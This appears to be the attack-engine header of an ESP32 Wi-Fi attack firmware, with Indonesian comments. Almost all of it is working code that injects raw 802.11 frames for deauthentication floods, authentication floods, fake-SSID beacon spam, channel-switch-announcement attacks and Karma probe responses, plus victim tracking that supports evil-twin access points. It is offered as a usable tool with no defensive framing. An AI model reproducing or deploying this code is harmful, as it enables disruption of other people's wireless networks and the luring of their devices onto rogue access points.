#ifndef ATTACK_ENGINE_H
#define ATTACK_ENGINE_H

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "karma.h"

#define PROBE_LOG_SIZE 32

// Parameter serangan yang bisa diubah saat runtime (definisi di main.cpp)
extern int cfg_deauth_burst;
extern int cfg_deauth_reason;
extern int cfg_auth_burst;
extern int cfg_hop_interval_ms;
extern int cfg_beacon_hop_ms;

enum AttackMode {
  ATK_IDLE = 0,
  ATK_DEAUTH_TARGET,
  ATK_DEAUTH_GLOBAL,
  ATK_AUTH_FLOOD,
  ATK_EVIL_TWIN,
  ATK_BEACON,
  ATK_PROBE,
  ATK_KARMA,
  ATK_CSA,
  ATK_CLIENT_MONITOR
};
extern volatile AttackMode g_attackMode;

extern volatile uint32_t g_packetsSent;
extern volatile uint32_t g_txErrors;
extern volatile bool g_victimFound;
extern uint8_t g_victimMAC[6];
extern uint8_t g_targetBSSID[6];
extern volatile uint8_t g_targetChannel;

extern unsigned long evilTwinStartTime;

// CSA target SSID (diisi oleh main.cpp saat start)
extern char g_csaTargetSSID[33];

static const char* SPAM_SSIDS[] = {
  "Free WiFi", "MikroTik", "TP-Link", "IndiHome",
  "FBI Surveillance", "Get Free Internet", "TELKOM", "Biznet",
  "AndroidAP", "iPhone Hotspot", "HUAWEI", "ZTE",
  "Pretty Fly for WiFi", "Loading...", "Virus.exe", "Tell My WiFi Love Her"
};
static const int SPAM_COUNT = sizeof(SPAM_SSIDS) / sizeof(SPAM_SSIDS[0]);

struct ProbeEntry {
  uint8_t mac[6];
  char ssid[33];
  int8_t rssi;
  uint16_t count;
};
extern ProbeEntry g_probeLog[PROBE_LOG_SIZE];
extern volatile int g_probeLogHead;
extern volatile int g_probeLogCount;
extern portMUX_TYPE g_probeLogMux;

#define CLIENT_MAX 24
struct ClientEntry {
  uint8_t mac[6];
  int8_t rssi;
  uint32_t packets;
  unsigned long lastSeen;
};
extern ClientEntry g_clients[CLIENT_MAX];
extern int g_clientCount;
extern portMUX_TYPE g_clientMux;

inline void clientMonitorLog(const uint8_t* mac, int8_t rssi) {
  portENTER_CRITICAL(&g_clientMux);
  for (int i = 0; i < g_clientCount; i++) {
    if (memcmp(g_clients[i].mac, mac, 6) == 0) {
      g_clients[i].rssi = rssi;
      g_clients[i].packets++;
      g_clients[i].lastSeen = millis();
      portEXIT_CRITICAL(&g_clientMux);
      return;
    }
  }
  if (g_clientCount < CLIENT_MAX) {
    memcpy(g_clients[g_clientCount].mac, mac, 6);
    g_clients[g_clientCount].rssi = rssi;
    g_clients[g_clientCount].packets = 1;
    g_clients[g_clientCount].lastSeen = millis();
    g_clientCount++;
  }
  portEXIT_CRITICAL(&g_clientMux);
}

// ═══════════════════════════════════════════════
// Deauth frame  [PATCH 4] reason code parameter
// ═══════════════════════════════════════════════
inline void sendDeauthFrame(const uint8_t* dst, const uint8_t* bssid, uint8_t reason = 0x01) {
  uint8_t frame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0x01, 0x00
  };
  memcpy(&frame[4],  dst,   6);
  memcpy(&frame[10], bssid, 6);
  memcpy(&frame[16], bssid, 6);
  frame[24] = reason;
  frame[25] = 0x00;

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true);
  g_packetsSent++;
  if (err != ESP_OK) g_txErrors++;
}

inline void sendDeauthBurst(const uint8_t* bssid) {
  static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  const uint8_t* dst = g_victimFound ? g_victimMAC : bcast;
  static const uint8_t reasons[] = { 0x01, 0x02, 0x03, 0x06, 0x07, 0x08 };
  for (int i = 0; i < cfg_deauth_burst; i++) {
    uint8_t reason = (cfg_deauth_reason > 0) ? (uint8_t)cfg_deauth_reason : reasons[i % 6];
    sendDeauthFrame(dst, bssid, reason);
  }
}

inline void sendBroadcastDeauthOnChannel(uint8_t n) {
  esp_wifi_set_channel(n, WIFI_SECOND_CHAN_NONE);
  static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  for (int i = 0; i < 6; i++) sendDeauthFrame(bcast, bcast);
}

inline void globalModeTick() {
  static unsigned long lastHop = 0;
  static uint8_t ch = 1;
  if (millis() - lastHop > (unsigned long)cfg_hop_interval_ms) {
    ch = (ch % 13) + 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    lastHop = millis();
  }
  sendBroadcastDeauthOnChannel(ch);
}

// ═══════════════════════════════════════════════
// Auth flood
// ═══════════════════════════════════════════════
inline void sendAuthFrame(const uint8_t* srcMAC, const uint8_t* bssid) {
  uint8_t frame[30];
  memset(frame, 0, sizeof(frame));
  frame[0] = 0xB0; frame[1] = 0x00;
  memcpy(&frame[4],  bssid,  6);
  memcpy(&frame[10], srcMAC, 6);
  memcpy(&frame[16], bssid,  6);
  frame[24] = 0x00; frame[25] = 0x00;
  frame[26] = 0x01; frame[27] = 0x00;
  frame[28] = 0x00; frame[29] = 0x00;

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true);
  g_packetsSent++;
  if (err != ESP_OK) g_txErrors++;
}

inline void sendAuthFloodTick() {
  static unsigned long lastTx = 0;
  static uint8_t srcMAC[6] = {0xAA, 0xBB, 0xCC, 0x11, 0x22, 0x33};
  if (millis() - lastTx > 10) {
    for (int i = 0; i < cfg_auth_burst; i++) {
      srcMAC[3] = (uint8_t)random(256);
      srcMAC[4] = (uint8_t)random(256);
      srcMAC[5] = (uint8_t)random(256);
      sendAuthFrame(srcMAC, g_targetBSSID);
    }
    lastTx = millis();
  }
}

// ═══════════════════════════════════════════════
// Beacon spam  [PATCH 3] dengan RSN IE (WPA2)
// ═══════════════════════════════════════════════
inline void sendBeaconFrame(const char* ssid, const uint8_t* bssid, uint8_t ch, uint8_t akm = 0x02) {
  uint8_t frame[160];
  int len = strlen(ssid);
  if (len > 32) len = 32;
  memset(frame, 0, sizeof(frame));

  // ── 802.11 MAC Header ──
  frame[0] = 0x80; frame[1] = 0x00;         // FC: Beacon
  frame[2] = 0x00; frame[3] = 0x00;         // Duration
  memset(&frame[4], 0xFF, 6);               // DA: broadcast
  memcpy(&frame[10], bssid, 6);             // SA
  memcpy(&frame[16], bssid, 6);             // BSSID
  frame[22] = 0x00; frame[23] = 0x00;       // Sequence control

  // ── Fixed Parameters ──
  int p = 32;
  frame[p++] = 0x64; frame[p++] = 0x00;     // Beacon interval
  // Capability: ESS + Privacy (0x0011) — Privacy bit → HP butuh password
  frame[p++] = 0x11; frame[p++] = 0x04;

  // ── SSID IE ──
  frame[p++] = 0x00;
  frame[p++] = (uint8_t)len;
  memcpy(&frame[p], ssid, len); p += len;

  // ── Supported Rates IE ──
  frame[p++] = 0x01; frame[p++] = 0x08;
  frame[p++] = 0x82; frame[p++] = 0x84; frame[p++] = 0x8B; frame[p++] = 0x96;
  frame[p++] = 0x0C; frame[p++] = 0x12; frame[p++] = 0x18; frame[p++] = 0x24;

  // ── DS Parameter IE ──
  frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = ch;

  // ── RSN IE (WPA2-PSK AES) ──
  frame[p++] = 0x30;
  frame[p++] = 0x14;                        // length = 20
  frame[p++] = 0x01; frame[p++] = 0x00;     // version 1
  // Group cipher: 00-0F-AC-04 (CCMP)
  frame[p++] = 0x00; frame[p++] = 0x0F; frame[p++] = 0xAC; frame[p++] = 0x04;
  // Pairwise cipher count=1
  frame[p++] = 0x01; frame[p++] = 0x00;
  // Pairwise: 00-0F-AC-04 (CCMP)
  frame[p++] = 0x00; frame[p++] = 0x0F; frame[p++] = 0xAC; frame[p++] = 0x04;
  // AKM count=1
  frame[p++] = 0x01; frame[p++] = 0x00;
  // AKM: 0x02 = PSK (WPA2), 0x08 = SAE (WPA3)
  frame[p++] = 0x00; frame[p++] = 0x0F; frame[p++] = 0xAC; frame[p++] = akm;
  // RSN capabilities
  frame[p++] = 0x00; frame[p++] = 0x00;

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, p, true);
  g_packetsSent++;
  if (err != ESP_OK) g_txErrors++;
}

inline void sendBeaconSpamTick() {
  static int idx = 0;
  static unsigned long lastHop = 0;
  static uint8_t ch = 1;
  if (millis() - lastHop > (unsigned long)cfg_beacon_hop_ms) {
    ch = (ch % 13) + 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    lastHop = millis();
  }
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(256);
  mac[0] &= 0xFE;   // unicast
  mac[0] |= 0x02;   // locally administered
  uint8_t akm = (idx % 2 == 0) ? 0x02 : 0x08;  // WPA2 / WPA3 bergantian
  sendBeaconFrame(SPAM_SSIDS[idx], mac, ch, akm);
  idx = (idx + 1) % SPAM_COUNT;
}

// ═══════════════════════════════════════════════
// CSA Attack — Channel Switch Announcement  [PATCH 2]
// ═══════════════════════════════════════════════
inline void sendCSABeacon(const uint8_t* bssid, const char* ssid,
                          uint8_t curCh, uint8_t newCh, uint8_t count) {
  uint8_t frame[128];
  int len = strlen(ssid);
  if (len > 32) len = 32;
  int p = 0;

  frame[p++] = 0x80; frame[p++] = 0x00;                 // Beacon
  frame[p++] = 0x00; frame[p++] = 0x00;
  memset(&frame[p], 0xFF, 6); p += 6;                    // DA broadcast
  memcpy(&frame[p], bssid, 6); p += 6;                   // SA = BSSID
  memcpy(&frame[p], bssid, 6); p += 6;                   // BSSID
  frame[p++] = 0x00; frame[p++] = 0x00;                  // Seq

  for (int i = 0; i < 8; i++) frame[p++] = 0x00;         // Timestamp
  frame[p++] = 0x64; frame[p++] = 0x00;                  // Beacon interval
  frame[p++] = 0x11; frame[p++] = 0x04;                  // Capability ESS+Privacy

  // SSID
  frame[p++] = 0x00;
  frame[p++] = (uint8_t)len;
  memcpy(&frame[p], ssid, len); p += len;

  // Supported rates
  frame[p++] = 0x01; frame[p++] = 0x08;
  frame[p++] = 0x82; frame[p++] = 0x84; frame[p++] = 0x8B; frame[p++] = 0x96;
  frame[p++] = 0x0C; frame[p++] = 0x12; frame[p++] = 0x18; frame[p++] = 0x24;

  // DS Parameter
  frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = curCh;

  // CSA IE
  frame[p++] = 0x25;
  frame[p++] = 0x03;
  frame[p++] = 0x01;
  frame[p++] = newCh;
  frame[p++] = count;

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, p, true);
  g_packetsSent++;
  if (err != ESP_OK) g_txErrors++;
}

inline void sendCSAActionFrame(const uint8_t* dst, const uint8_t* bssid,
                               uint8_t newCh, uint8_t count) {
  uint8_t frame[64];
  int p = 0;

  frame[p++] = 0xD0; frame[p++] = 0x00;                 // Action
  frame[p++] = 0x00; frame[p++] = 0x00;
  memcpy(&frame[p], dst, 6); p += 6;
  memcpy(&frame[p], bssid, 6); p += 6;
  memcpy(&frame[p], bssid, 6); p += 6;
  frame[p++] = 0x00; frame[p++] = 0x00;

  frame[p++] = 0x00;                                    // Category: Spectrum Mgmt
  frame[p++] = 0x04;                                    // Action: CSA

  frame[p++] = 0x25; frame[p++] = 0x03;
  frame[p++] = 0x01;
  frame[p++] = newCh;
  frame[p++] = count;

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, p, true);
  g_packetsSent++;
  if (err != ESP_OK) g_txErrors++;
}

inline void sendCSATick() {
  static unsigned long lastTx = 0;
  if (millis() - lastTx < 25) return;
  lastTx = millis();

  static const uint8_t fakeChTable[] = { 1, 6, 11, 13, 3, 9 };
  static uint8_t fakeChIdx = 0;
  uint8_t newCh;
  do {
    newCh = fakeChTable[fakeChIdx++ % (sizeof(fakeChTable))];
  } while (newCh == g_targetChannel);
  uint8_t count = 1;

  sendCSABeacon(g_targetBSSID, g_csaTargetSSID, g_targetChannel, newCh, count);

  if (g_victimFound) {
    sendCSAActionFrame(g_victimMAC, g_targetBSSID, newCh, count);
  }
}

// ═══════════════════════════════════════════════
// Sniffer
// ═══════════════════════════════════════════════
inline void packetSniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t sig_len = pkt->rx_ctrl.sig_len;

  if (sig_len < 24) return;

  if (type == WIFI_PKT_MGMT) {
    uint8_t subtype = (p[0] >> 4) & 0x0F;

    if (g_attackMode == ATK_PROBE) {
      if (subtype != 4) return;
      if (sig_len < 26) return;
      if (p[24] != 0x00) return;
      int len = p[25];
      if (len > 32) return;
      if (sig_len < 26 + len) return;

      portENTER_CRITICAL(&g_probeLogMux);
      // dedupe per MAC + hitung jumlah probe
      for (int i = 0; i < g_probeLogCount; i++) {
        int e = (g_probeLogHead - g_probeLogCount + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
        if (memcmp(g_probeLog[e].mac, &p[10], 6) == 0) {
          g_probeLog[e].rssi = pkt->rx_ctrl.rssi;
          g_probeLog[e].count++;
          if (len > 0) {
            memset(g_probeLog[e].ssid, 0, 33);
            memcpy(g_probeLog[e].ssid, &p[26], len);
          }
          portEXIT_CRITICAL(&g_probeLogMux);
          return;
        }
      }
      int idx = g_probeLogHead;
      memcpy(g_probeLog[idx].mac, &p[10], 6);
      memset(g_probeLog[idx].ssid, 0, 33);
      if (len > 0) memcpy(g_probeLog[idx].ssid, &p[26], len);
      g_probeLog[idx].ssid[32] = 0;
      g_probeLog[idx].rssi = pkt->rx_ctrl.rssi;
      g_probeLog[idx].count = 1;
      g_probeLogHead = (g_probeLogHead + 1) % PROBE_LOG_SIZE;
      if (g_probeLogCount < PROBE_LOG_SIZE) g_probeLogCount++;
      portEXIT_CRITICAL(&g_probeLogMux);
      return;
    }

    if (g_attackMode == ATK_KARMA) {
      if (subtype != 4) return;
      if (sig_len < 26) return;
      if (p[24] != 0x00) return;
      int len = p[25];
      if (len > 32) return;
      if (sig_len < 26 + len) return;

      const uint8_t* srcMAC = &p[10];
      int8_t rssi = pkt->rx_ctrl.rssi;

      karmaLogClient(srcMAC, rssi);

      if (len > 0) {
        char probedSSID[33];
        memcpy(probedSSID, &p[26], len);
        probedSSID[len] = 0;
        karmaLogSSID(probedSSID);

        if (g_karmaActiveMode) {
          static unsigned long lastResp = 0;
          if (millis() - lastResp > 50) {
            lastResp = millis();
            sendKarmaProbeResponse(srcMAC, probedSSID);
          }
        }
      } else {
        if (g_karmaActiveMode) {
          static unsigned long lastResp = 0;
          if (millis() - lastResp > 100) {
            lastResp = millis();
            for (int i = 0; i < CURATED_COUNT; i++) {
              sendKarmaProbeResponse(srcMAC, CURATED_SSIDS[i]);
            }
          }
        }
      }
      return;
    }
  }

  // Victim tracking untuk DEAUTH, EVIL_TWIN, dan CSA
  if (g_attackMode == ATK_DEAUTH_TARGET ||
      g_attackMode == ATK_EVIL_TWIN ||
      g_attackMode == ATK_CSA) {
    uint8_t* addr1 = &p[4];
    uint8_t* addr2 = &p[10];
    uint8_t* addr3 = &p[16];
    if (memcmp(addr1, g_targetBSSID, 6) == 0 ||
        memcmp(addr2, g_targetBSSID, 6) == 0 ||
        memcmp(addr3, g_targetBSSID, 6) == 0) {
      if (memcmp(addr2, g_targetBSSID, 6) != 0 && (addr2[0] & 0x01) == 0) {
        if (!g_victimFound || memcmp(g_victimMAC, addr2, 6) != 0) {
          memcpy(g_victimMAC, addr2, 6);
          g_victimFound = true;
        }
      }
    }
  }

  if (g_attackMode == ATK_CLIENT_MONITOR && type == WIFI_PKT_DATA) {
    uint8_t* a1 = &p[4];
    uint8_t* a2 = &p[10];
    uint8_t* a3 = &p[16];
    if (memcmp(a1, g_targetBSSID, 6) == 0 ||
        memcmp(a2, g_targetBSSID, 6) == 0 ||
        memcmp(a3, g_targetBSSID, 6) == 0) {
      const uint8_t* cand[2] = { a1, a2 };
      for (int i = 0; i < 2; i++) {
        if (memcmp(cand[i], g_targetBSSID, 6) != 0 &&
            (cand[i][0] & 0x01) == 0 &&
            cand[i][0] != 0xFF) {
          clientMonitorLog(cand[i], pkt->rx_ctrl.rssi);
        }
      }
    }
  }
}

// ═══════════════════════════════════════════════
// FreeRTOS Attack Task
// ═══════════════════════════════════════════════
inline void attackTask(void* param) {
  (void)param;
  while (true) {
    switch (g_attackMode) {
      case ATK_DEAUTH_TARGET: {
        static unsigned long lastTx = 0;
        if (millis() - lastTx > 15) {
          sendDeauthBurst(g_targetBSSID);
          lastTx = millis();
        }
        break;
      }
      case ATK_DEAUTH_GLOBAL:
        globalModeTick();
        break;
      case ATK_AUTH_FLOOD:
        sendAuthFloodTick();
        break;
      case ATK_EVIL_TWIN: {
        static unsigned long lastTx = 0;
        if (millis() - evilTwinStartTime > 3000) {
          if (WiFi.softAPgetStationNum() == 0 && millis() - lastTx > 20) {
            sendDeauthBurst(g_targetBSSID);
            lastTx = millis();
          }
        }
        break;
      }
      case ATK_BEACON:
        sendBeaconSpamTick();
        break;
      case ATK_CSA:
        sendCSATick();
        break;
      case ATK_CLIENT_MONITOR:
        break;
      case ATK_PROBE: {
        static unsigned long lastHop = 0;
        static uint8_t hopIdx = 0;
        const uint8_t hopChannels[] = {1, 6, 11};
        if (millis() - lastHop > 500) {
          hopIdx = (hopIdx + 1) % 3;
          esp_wifi_set_channel(hopChannels[hopIdx], WIFI_SECOND_CHAN_NONE);
          lastHop = millis();
        }
        break;
      }
      case ATK_KARMA: {
        static unsigned long lastHop = 0;
        static uint8_t hopIdx = 0;
        const uint8_t hopChannels[] = {1, 6, 11};
        if (millis() - lastHop > 300) {
          hopIdx = (hopIdx + 1) % 3;
          esp_wifi_set_channel(hopChannels[hopIdx], WIFI_SECOND_CHAN_NONE);
          lastHop = millis();
        }
        break;
      }
      default:
        break;
    }
    vTaskDelay(10 / portTICK_PERIOD_MS);
  }
}

#endif